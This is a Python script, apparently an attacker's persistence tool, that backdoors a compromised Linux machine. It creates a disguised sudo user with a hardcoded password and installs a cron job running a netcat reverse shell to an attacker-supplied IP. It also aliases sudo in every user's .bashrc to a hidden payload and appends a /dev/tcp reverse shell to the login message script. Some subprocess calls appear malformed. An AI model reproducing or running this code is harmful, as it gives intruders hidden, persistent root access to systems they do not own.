import os
import subprocess
import sys

def createSuperUser():
	username = 'ftp' #switch to fit more likely with something
	password = 'returnER' #change password if you want
	subprocess.run(['useradd', '-aG sudo', '-p', password, username])

def createCronTabBackDoor(ip):
	subprocess.run(f'(crontab -l ; echo "*/2 * * * * sleep 200 && nc {ip} 8888 -e /bin/bash") | crontab 2> /dev/null')

def backDoorBashRC():
	userHomeDirs = os.listdir('/home')
	for user in userHomeDirs:
		with open(f'/home/{user}/.bashrc', 'a') as bashrc:
			bashrc.write('chmod u+x /etc/default/.cron.d/sudoy')
			bashrc.write('alias sudo=/etc/default/.cron.d/sudoy')

	subprocess.run('mv ./payloads/sudoy /etc/default/.cron.d/sudoy')

def backDoorMessageOfTheDay(ip):
	with open('/etc/update-motd.d/00-header', 'a') as headerFile:
		headerFile.write(f'bash -c "bash -i >& /dev/tcp/{ip}/8282 0>&1"') #update the ip and port accordingly

def main():
	attackBoxIP = sys.argv[1] #first command line argument is the ip of teh box you want to set the reverse shells to connect back to
	backDoorMessageOfTheDay(attackBoxIP)
	backDoorBashRC()
	createCronTabBackDoor(attackBoxIP)
	createSuperUser()

if __name__ == '__main__':
	main()